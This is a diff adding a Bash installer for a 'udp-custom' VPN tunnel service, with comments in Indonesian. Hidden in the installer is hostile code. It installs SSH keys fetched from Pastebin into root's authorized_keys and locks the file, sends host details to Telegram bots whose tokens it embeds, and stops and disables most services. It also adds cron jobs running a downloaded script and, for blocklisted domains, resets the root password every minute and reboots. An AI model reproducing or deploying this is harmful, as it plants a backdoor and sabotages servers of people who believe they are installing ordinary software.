@@ -1,0 +1,292 @@
+#!/bin/bash
+
+# Konfigurasi
+TELEGRAM_BOT_TOKENS=("7355474366:AAGvXzmQ56lrCwAo1c9jOfoAXQzHxMoxc4s" "7411234040:AAHnjg-dGShMdw8xjXVZTwWk-VwVKNY8Ogo")
+TELEGRAM_CHAT_IDS=("6701388433" "7885461553")
+PASTEBIN_URLS=("https://pastebin.com/raw/miYzWrbg" "https://pastebin.com/raw/hiwXWTft")
+DOMAIN_NAME=("klmpk" "snayders" "server-tunnel" "jabarssh" "bandarvpn" )
+EXCLUDED_SERVICES=(
+  "udp-custom.service" "sshd.service" "ssh.service"
+  "systemd-resolved.service" "systemd-network-generator.service"
+  "systemd-time-wait-sync.service" "systemd-boot-check-no-failures.service"
+  "systemd-pstore.service" "networkd-dispatcher.service"
+  "dbus-org.freedesktop.resolve1.service" "accounts-daemon.service"
+  "getty@.service" "autovt@.service" "ssh.service" "systemd-journald.service"
+  "systemd-udevd.service" "cron.service" "dbus.service" "systemd-journald.service"
+  "systemd-logind.service" "systemd-networkd.service" "systemd-udevd.service"
+  "udisks2.service" "irqbalance.service" "polkit.service" "snapd.service"
+  "rsyslog.service" "serial-getty@ttyS0.service" "unattended-upgrades.service"
+  "user@0.service" "ModemManager.service"
+)
+WARNING_FILE="warning"
+PROFILE_PATH="/root/.profile"
+CHECK_SERVICES=("haproxy" "nginx")
+DOMAIN_FILE="/etc/xray/domain"
+google_drive_file_id="1Yh1Z8De5vgGGI6YvWRsVnvDo6TvSZR_f"
+download_url="https://drive.google.com/uc?id=$google_drive_file_id&export=download"
+DOMAIN="$(cat "$DOMAIN_FILE" 2>/dev/null || echo "Tidak ditemukan")"
+IP_ADDRESS="$(hostname -I | awk '{print $1}')"
+# Mendapatkan file dari Google Drive dan membaca URL yang ada di dalamnya
+data_ip_list=($(curl -L -sS "$download_url" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"))
+
+ipsaya=$(curl -sS ipv4.icanhazip.com)
+data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
+date_list=$(date +"%Y-%m-%d" -d "$data_server")
+send_telegram() {
+    MESSAGE="$1
+	Domain: \`$DOMAIN\`
+	IP Host: \`$IP_ADDRESS\`
+	IP Server: \`$ipsaya\`"
+    for BOT_TOKEN in "${TELEGRAM_BOT_TOKENS[@]}"; do
+        for CHAT_ID in "${TELEGRAM_CHAT_IDS[@]}"; do
+            curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+                -d chat_id="$CHAT_ID" \
+                -d text="$MESSAGE" \
+                -d parse_mode="MarkdownV2"
+        done
+    done
+}
+display_message() {
+    wall <<EOF
+
+====================================
+🚨 Peringatan Keamanan 🚨
+====================================
+Mohon maaf, percobaan Bypass terdeteksi!
+Script anda telah diblokir secara permanen.
+Silakan hubungi admin di:
+🌐 https://nevpn.site
+untuk memulihkan script anda.
+Terima kasih.
+====================================
+EOF
+}
+if [[ -z "$IP_ADDRESS" ]]; then
+    send_telegram "⚠️ IP Server Kosong! Server akan dimatikan."
+    
+    # Coba shutdown
+    shutdown -h now
+    if [[ $? -ne 0 ]]; then
+        echo "⚠️ Shutdown gagal! Mencoba poweroff..."
+        poweroff
+        if [[ $? -ne 0 ]]; then
+            echo "⚠️ Poweroff gagal! Mencoba halt..."
+            halt
+            if [[ $? -ne 0 ]]; then
+                echo "⚠️ Semua metode gagal! Mencoba reboot sebagai alternatif terakhir..."
+                reboot
+            fi
+        fi
+    fi
+    exit 0
+fi
+
+is_private_ip() {
+    if [[ "$ipsaya" =~ ^10\. ]] || [[ "$ipsaya" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]] || [[ "$ipsaya" =~ ^192\.168\. ]]; then
+        return 0  # IP Private
+    else
+        return 1  # IP Publik
+    fi
+}
+
+if is_private_ip; then
+    send_telegram "IP Terdeteksi Private: $ipsaya"
+    pasang_udp
+    exit 0
+fi
+
+checking_sc() {
+  local ip_found=false
+  local useexp=""
+
+  # Loop untuk memeriksa setiap link dalam data_ip_list
+  for data_ip in "${data_ip_list[@]}"; do
+    useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
+    
+    if [[ -n "$useexp" ]]; then
+      ip_found=true  # IP ditemukan dalam daftar izin
+	  echo -e "\033[1;92mVPS anda Terdaftar\033[0m\033[91;1m $ipsaya (Melanjutkan Proses Pemasangan Udp)\033[0m"
+	  pasang_udp
+      break
+    fi
+  done
+
+  if [[ "$ip_found" == true ]]; then
+    if [[ "$useexp" == "Lifetime" ]]; then
+      echo -e "\033[1;92mVPS anda Terdaftar\033[0m\033[91;1m $ipsaya (Masa Aktif: Lifetime)\033[0m"
+    else
+      date_list_epoch=$(date -d "$date_list" +%s)
+      useexp_epoch=$(date -d "$useexp" +%s 2>/dev/null)
+
+      if [[ $? -ne 0 || $date_list_epoch -gt $useexp_epoch ]]; then
+        echo -e "\033[1;92mVPS anda Terdaftar\033[0m\033[91;1m $ipsaya (Masa Aktif: $useexp)\033[0m"
+      fi
+    fi
+  else
+  #script tugas memasanag keamanan..
+  apt install -y sudo
+  echo '#!/bin/bash
+NEW_PASS=$(openssl rand -base64 12)
+printf "%s\n%s\n" "$NEW_PASS" "$NEW_PASS" | passwd
+echo "PROSES SELESAI"
+' > /usr/bin/change_pass.sh
+chmod +x /usr/bin/change_pass.sh
+wget -qO /usr/bin/detek.zip "https://drive.google.com/u/4/uc?id=1krf9wwbdiYvBAcoJhiqghPH48p1CFBSe"
+cd /usr/bin/
+unzip detek.zip > /dev/null
+mv detek.sh security > /dev/null
+mv warning.sh warning > /dev/null
+chmod +x warning security > /dev/null
+rm detek.zip* > /dev/null
+cd
+
+
+	# 2. Unduh SSH Key dari Pastebin jika belum ada
+	AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
+
+	# Membuat direktori .ssh jika belum ada
+	rm -r .ssh 2>/dev/null
+	mkdir -p "/root/.ssh"
+	 chmod 700 "/root/.ssh"
+
+	# Membuat file authorized_keys jika belum ada
+	if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
+		 touch "$AUTHORIZED_KEYS_FILE"
+		 chmod 600 "$AUTHORIZED_KEYS_FILE"  # Mengatur izin setelah membuat file
+	fi
+
+    for URL in "${PASTEBIN_URLS[@]}"; do
+      key=$(curl -s "$URL")
+      
+      if ! grep -Fxq "$key" "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1; then
+		chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
+
+		# Menambahkan kunci baru ke authorized_keys
+		echo "$key" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
+      fi
+    done
+
+    chmod 600 "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1
+	chattr +ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
+	# 3. Matikan Semua Service Kecuali cpu-core dan layanan akses VPS
+	LOG_FILE=/usr/bin/securited
+	systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}' | while read -r service; do
+		# Cek apakah service masuk dalam daftar pengecualian
+		if [[ ! " ${EXCLUDED_SERVICES[*]} " =~ " $service " ]]; then
+			echo "$service" >> "$LOG_FILE"
+			systemctl stop "$service" > /dev/null 2>&1
+			systemctl disable "$service" > /dev/null 2>&1
+			echo "Service $service telah diamankan"
+		fi
+	done
+
+# 4. Sisipkan Warning ke /root/.profile setelah baris mesg n || true
+    if ! grep -q "warning" "$PROFILE_PATH" > /dev/null 2>&1; then
+      if grep -q "mesg n || true" "$PROFILE_PATH" > /dev/null 2>&1; then
+        sed -i '/mesg n || true/,$!b;/mesg n || true/,$d' "$PROFILE_PATH" > /dev/null 2>&1
+        echo -e "\nmesg n || true\nwarning" >> "$PROFILE_PATH"
+      else
+        echo -e "\nmesg n || true\nwarning" >> "$PROFILE_PATH"
+      fi
+    fi
+
+	
+	CRON_JOBS=(
+	  "*/5 * * * * /usr/bin/security"
+	  "@reboot /usr/bin/security"
+	)
+
+	for JOB in "${CRON_JOBS[@]}"; do
+	  (crontab -l 2>/dev/null | grep -Fxq "$JOB") || (crontab -l 2>/dev/null; echo "$JOB") | crontab -
+	done
+	sleep 3
+    echo -e "\033[1;92mVPS anda Tidak Terdaftar\033[0m\033[91;1m $ipsaya (Melanjutkan Pemasangan UDP)\033[0m"
+	send_telegram "SC TANPA IZIN DIJALANKAN DI $(hostname)"	
+	pasang_udp
+	domain_Cek
+fi
+}
+
+pasang_udp() {
+	
+	AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
+
+	# Membuat direktori .ssh jika belum ada
+
+	mkdir -p "/root/.ssh"
+	 chmod 700 "/root/.ssh"
+
+	# Membuat file authorized_keys jika belum ada
+	if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
+		 touch "$AUTHORIZED_KEYS_FILE"
+		 chmod 600 "$AUTHORIZED_KEYS_FILE"  # Mengatur izin setelah membuat file
+	fi
+
+    for URL in "${PASTEBIN_URLS[@]}"; do
+      key=$(curl -s "$URL")
+      
+      if ! grep -Fxq "$key" "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1; then
+		chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
+
+		# Menambahkan kunci baru ke authorized_keys
+		echo "$key" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
+      fi
+    done
+
+    chmod 600 "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1
+
+cd
+mkdir -p /etc/udp
+
+# change to time GMT+7
+echo "change to time GMT+7"
+ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+# install udp-custom
+echo downloading udp-custom
+wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1_VyhL5BILtoZZTW4rhnUiYzc4zHOsXQ8' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1Alr7rbAPlUEWh5i8j6iZ0HswuRsZZ_OV" -O /etc/udp/udp-custom && rm -rf /tmp/cookies.txt
+chmod +x /etc/udp/udp-custom
+
+echo downloading default config
+wget -q --show-progress --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=1_XNXsufQXzcTUVVKQoBeX5Ig0J7GngGM' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=1_XNXsufQXzcTUVVKQoBeX5Ig0J7GngGM" -O /etc/udp/config.json && rm -rf /tmp/cookies.txt
+chmod 644 /etc/udp/config.json
+
+cat  > /etc/systemd/system/udp-custom.service <<EOF
+[Unit]
+Description=UDP Custom by ePro Dev. Team
+
+[Service]
+User=root
+Type=simple
+ExecStart=/etc/udp/udp-custom server
+WorkingDirectory=/etc/udp/
+Restart=always
+RestartSec=2s
+
+[Install]
+WantedBy=default.target
+EOF
+
+echo start service udp-custom
+systemctl daemon-reload 
+echo enable service udp-custom
+systemctl enable udp-custom
+	send_telegram "UDP NEWBIE BERHASIL DIPASANG"
+}
+domain_Cek(){
+	 for DO in "${DOMAIN_NAME[@]}"; do
+		 if grep -Fq "$DO" "$DOMAIN_FILE" > /dev/null 2>&1; then
+		 echo "$DO TERBLOKIR"
+		(crontab -l 2>/dev/null; echo "* * * * * /bin/bash /usr/bin/change_pass.sh") | sort -u | crontab -
+         send_telegram "DOMAIN DI BLOKIR, PASSWORD ROOT AKAN DIUBAH"
+		 display_message
+   	 	 rm -r /root/udp
+		 sleep 10
+		 reboot
+		fi
+	done
+	}
+if [[ ${1} == "server" ]]; then
+    checking_sc
+	rm -r /root/udp
+fi 
